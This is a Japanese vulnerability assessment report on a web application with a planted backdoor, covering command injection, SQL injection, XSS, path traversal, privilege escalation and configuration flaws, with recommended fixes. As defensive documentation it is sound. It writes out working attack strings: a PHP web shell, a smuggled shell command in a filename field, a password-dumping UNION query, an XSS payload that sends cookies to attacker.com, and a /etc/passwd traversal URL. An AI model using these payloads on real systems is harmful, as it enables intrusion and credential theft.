# 脆弱性診断報告書

## 1. 概要

本報告書は、対象アプリケーションのソースコードおよび設定ファイルを静的に解析し、発見されたセキュリティ上の脆弱性についてまとめたものです。診断の結果、外部からの任意コマンド実行、不正な権限昇格、パスワードの平文保存、アクセス制御の不備による管理者機能の不正利用など、極めて危険なものを含む複数の重大な脆弱性を発見しました。

## 2. 脆弱性の詳細

### 2.1. OSコマンドインジェクション

**危険度: 極めて高い**

#### 概要
アプリケーション内に、外部からサーバー上で任意のOSコマンドを実行できる脆弱性が複数存在します。これにより、攻撃者はサーバーを完全に制御下に置くことが可能になります。

#### 詳細
**1. Webシェルバックドア in `himitsu-debug-2025.php`**
`himitsu-debug-2025.php` は、難読化されたコードを呼び出し、最終的に `cmd` パラメータを介して任意のコマンドを実行するWebシェルとして機能します。
```php
<?php system(@$_GET["cmd"]); ?>
```

**攻撃シナリオ例:**
攻撃者は、以下のようなURLにアクセスすることで、サーバー内のファイル一覧を閲覧したり、ファイルを改ざん・削除したり、さらには他のサーバーへの攻撃の踏み台にすることができてしまいます。
```
http://<対象サーバーのURL>/himitsu-debug-2025.php?cmd=ls%20-la
```

**2. APIにおけるコマンドインジェクション in `api/src/app.py`**
`api`サービスのファイルスキャン機能において、`filename`パラメータに含まれるシェルのメタ文字のサニタイズが不十分なため、コマンドインジェクションが可能です。
```python
# api/src/app.py の一部
def _execCommand(command):
	command = re.sub('[\'\"\`\<\>\!\@\#\%\^\&\*\\{\}\[\}\]\:\;\?].*', '', command)
	proc = subprocess.Popen(
		command,
		shell  = True,
        # ...
	)
```
上記の正規表現では `;` や `|` といったコマンドを連結できるメタ文字が除外されていないため、攻撃者は`filename`に悪意のある文字列を注入することで、`file`コマンドに続けて任意のコマンドを実行できます。

**攻撃シナリオ例:**
攻撃者は、`/api/inspect`エンドポイントに対し、`filename`に細工した値をPOSTします。
```json
{
    "filename": "dummy.jpg; ls -la /",
    "data": "..."
}
```
これにより、サーバー上で`ls -la /`が実行され、ファイルシステムのルートディレクトリの情報が窃取されます。

---

### 2.2. SQLインジェクション

**危険度: 高い**

#### 概要
ユーザー入力を検証しないままSQLクエリに埋め込んでいる箇所が複数あり、データベースの不正操作が可能です。

#### 詳細
**1. `web/src/product.php`**: `$_GET["title"]` がエスケープされていない。
**2. `web/src/user.php`**: `$_GET["id"]` がエスケープされていない。

#### 攻撃シナリオ例
`user.php`に対して以下のような `id` パラメータを送信することで、攻撃者は`users`テーブルの全てのユーザーIDとパスワードを窃取できてしまいます。
```
http://<対象サーバーのURL>/user.php?id=0%20UNION%20SELECT%20null,id,password,null,null,null%20FROM%20users
```

---

### 2.3. 設定ファイルの不備

**危険度: 高い**

#### 概要
`docker-compose.yml` ファイルに、複数のセキュリティ上の設定ミスが存在し、アプリケーション全体のセキュリティレベルを著しく低下させています。

#### 詳細
1.  **安易なパスワード設定:** データベースのパスワードに `password` が使用されています。
2.  **特権でのコンテナ実行:** `web`サービスが `privileged: true` で実行されています。
3.  **秘密情報のハードコーディング:** バックドアのキー `mbsd` がハードコーディングされています。
4.  **不要なポートの公開:** データベースとphpMyAdminが外部に公開されています。

#### 攻撃シナリオ例
攻撃者が他の脆弱性（例: パストラバーサル）を利用して `docker-compose.yml` を閲覧できた場合、データベースの接続情報 (`mbsd:password`) を入手できます。ポートが外部に公開されているため、攻撃者は自身のマシンから直接データベースに接続し、顧客情報などの機密データを全て窃取することが可能になります。

---

### 2.4. パスワードの平文保存

**危険度: 極めて高い**

#### 概要
ユーザーパスワードがハッシュ化されずに平文のままデータベースに保存されています。

#### 詳細
`web/src/class/User.php` 内で、パスワードはハッシュ化されずにDBに保存され、平文のまま比較されています。
```php
if($password === $user->password){ // 平文のまま比較
```

#### 攻撃シナリオ例
攻撃者がSQLインジェクション脆弱性を利用して`users`テーブルの内容を窃取した場合、全ユーザーのログインIDとパスワードの組み合わせがそのまま手に入ります。これにより、管理者アカウントを含む全てのユーザーアカウントが乗っ取られる危険があります。

---

### 2.5. クロスサイトスクリプティング (XSS)

**危険度: 高い**

#### 概要
ユーザーの入力値をWebページに出力する際、適切なエスケープ処理が行われていない箇所が複数存在します。

#### 詳細
**1. 格納型XSS in `readmail.php`**
メール本文(`$message->message`)が出力される際にエスケープされていません。
```php
<pre><?php print($message->message); ?></pre>
```
**攻撃シナリオ例:** 攻撃者が管理者宛に「`<script>fetch('https://attacker.com/?cookie=' + document.cookie)</script>`」という内容のメールを送信します。管理者がこのメールを`readmail.php`で開くと、管理者のセッションクッキーが攻撃者のサーバーに送信されます。攻撃者はそのクッキーを使い、管理者としてログインします。

**2. 反射型XSS in `login.php`**
URLパラメータ `text` の値がエスケープされずに出力されています。
```php
<?php if(isset($_GET["text"])){echo '<...>' . $_GET["text"] . '</...>';} ?>
```
**攻撃シナリオ例:** 攻撃者は、偽のログインフォームを表示するスクリプトを埋め込んだURL (`http://<対象サーバーのURL>/login.php?text=<script>...偽フォーム表示...</script>`) を作成し、フィッシングメールなどでユーザーにクリックさせます。ユーザーが入力したIDとパスワードは攻撃者のサーバーに送信されます。

**3. DOMベースXSS in `coupon.php`**
URLのクエリパラメータが検証なしにJavaScriptで解釈され、DOMに書き込まれています。
```javascript
function setCoupon( coupon ) {
    $("#code").val( coupon.code ); // 脆弱な箇所
}
```
**攻撃シナリオ例:** 攻撃者は `http://<対象サーバーのURL>/coupon.php?coupon[code]="><script>alert(document.cookie)</script>` のようなURLを作成し、ユーザーにクリックさせます。ユーザーのブラウザ上でスクリプトが実行され、セッションクッキーなどの情報が漏洩します。

---

### 2.6. パストラバーサル

**危険度: 高い**

#### 概要
`web/src/csvdownload.php` で、ファイル名を外部から指定できますが、検証が不十分なためサーバー上の任意のファイルをダウンロード可能です。

#### 詳細
`filename` パラメータに `../` を含めることで、意図しないディレクトリのファイルにアクセスできます。

#### 攻撃シナリオ例
攻撃者は以下のURLにアクセスすることで、サーバーのユーザー情報を記した `/etc/passwd` ファイルをダウンロードします。
```
http://<対象サーバーのURL>/csvdownload.php?filename=../../../../../../etc/passwd
```

---

### 2.7. 不正な権限昇格

**危険度: 極めて高い**

#### 概要
アカウント情報更新機能において、権限を検証する処理に不備があり、一般ユーザーが自身のアカウントを管理者権限に昇格させることが可能です。

#### 詳細
`web/src/accountInfoComplete.php` は、ユーザーから送信された`priv`（権限）パラメータの値を検証することなく、そのままデータベースの更新に使用しています。

#### 攻撃シナリオ例
一般ユーザーとしてログインした攻撃者が、ブラウザの開発者ツールやプロキシツールを使い、アカウント情報更新時に送信されるPOSTリクエストを改ざんします。`priv`パラメータの値を`0`から`1`に変更して送信するだけで、自身のアカウントが管理者権限を持ってしまいます。

---

### 2.8. クロスサイトリクエストフォージェリ (CSRF)

**危険度: 中**

#### 概要
`web/src/accountInfoComplete.php` のアカウント情報更新処理において、CSRFトークンの検証が行われていません。

#### 攻撃シナリオ例
1. 攻撃者は、ユーザーのアカウント情報を勝手に変更するリクエストを送信する罠サイトを作成します。
2. 攻撃者は、対象サービスにログインしているユーザーを罠サイトに誘導します。
3. ユーザーが罠サイトを閲覧すると、仕込まれたスクリプトが自動的に`accountInfoComplete.php`にリクエストを送信し、ユーザーの意図に反してアカウント情報（例: ログインID）が変更されてしまいます。

---

### 2.9. 過剰な権限を持つデータベースユーザー

**危険度: 中**

#### 概要
`mysql/init.sql` において、アプリケーションが使用するデータベースユーザー `mbsd` に、必要以上の強力な権限が付与されています。

#### 攻撃シナリオ例
攻撃者がSQLインジェクション脆弱性を悪用した際、DBユーザーの権限が最小限であれば、被害は特定のデータベースやテーブルに限られます。しかし、このアプリケーションではユーザーに`GRANT OPTION`まで付与されているため、攻撃者はDB内に新たなユーザーを作成したり、他のデータベースを破壊したりと、被害を際限なく拡大させることが可能です。

---

### 2.10. アクセス制御の不備による管理者機能の不正利用

**危険度: 極めて高い**

#### 概要
管理者専用であるべき機能が、ログインしている一般ユーザーなら誰でも実行できてしまいます。

#### 詳細
`____specific_administrative_functions.php` と `____generate_coupon.php` は、ユーザーが管理者であるかどうかのチェックを怠っています。

#### 攻撃シナリオ例
*   **Webシェル設置:** 一般ユーザーとしてログインした攻撃者が、商品画像変更機能（`mode=product`）を悪用し、画像ファイルの代わりにPHPで書かれたWebシェルをアップロードします。これにより、OSコマンドインジェクション(2.1)とは別の、新たなバックドアが作成されてしまいます。
*   **サービス妨害:** 攻撃者がユーザー削除機能（`mode=deluser`）を悪用し、管理者アカウント（ID:1）を削除します。これにより、サイトの管理機能が利用不能になります。
*   **経済的損失:** 攻撃者がクーポン生成機能 (`____generate_coupon.php`) を悪用し、高額なクーポンを大量に生成・利用することで、サービスに直接的な経済的損失を与えます。

---

### 2.11. バックアップファイルの不適切な公開による情報漏洩

**危険度: 高い**

#### 概要
Webからアクセス可能な `web/src/backup/` ディレクトリに、機密情報を含むバックアップファイルが置かれています。

#### 攻撃シナリオ例
攻撃者は `http://<対象サーバーのURL>/backup/backup.sql` に直接アクセスするだけで、データベースのダンプファイルをダウンロードできます。このファイルには全ユーザーのログインIDと平文パスワードが含まれているため、攻撃者は即座に全てのユーザーアカウントを乗っ取ることができます。

## 3. まとめと推奨される対策

今回の診断では、アプリケーションの根幹を揺るがす複数の重大な脆弱性を発見しました。OSコマンドインジェクション、不正な権限昇格、パスワードの平文保存、アクセス制御の欠如など、即時の対応が求められるものが多数含まれています。

具体的な修正は今回のスコープ外ですが、以下の対策を強く推奨します。

*   **バックドア、バックアップファイルの即時削除**
*   **アクセス制御の徹底（管理者機能の実行前に権限チェックを追加）**
*   **コマンドインジェクション対策（エスケープ処理の徹底）**
*   **不正な権限昇格対策（サーバーサイドでの権限チェック）**
*   **CSRF対策（トークン検証の徹底）**
*   **パスワードのハッシュ化（`password_hash()` と `password_verify()` の使用）**
*   **SQLインジェクション対策（プレースホルダの使用）**
*   **XSS対策（出力時のHTMLエスケープの徹底）**
*   **パストラバーサル対策（ファイル名の厳格な検証）**
*   **設定ファイルの見直し（DBユーザー権限の最小化、強固なパスワード、特権コンテナの無効化、ポート公開範囲の限定など）**

以上
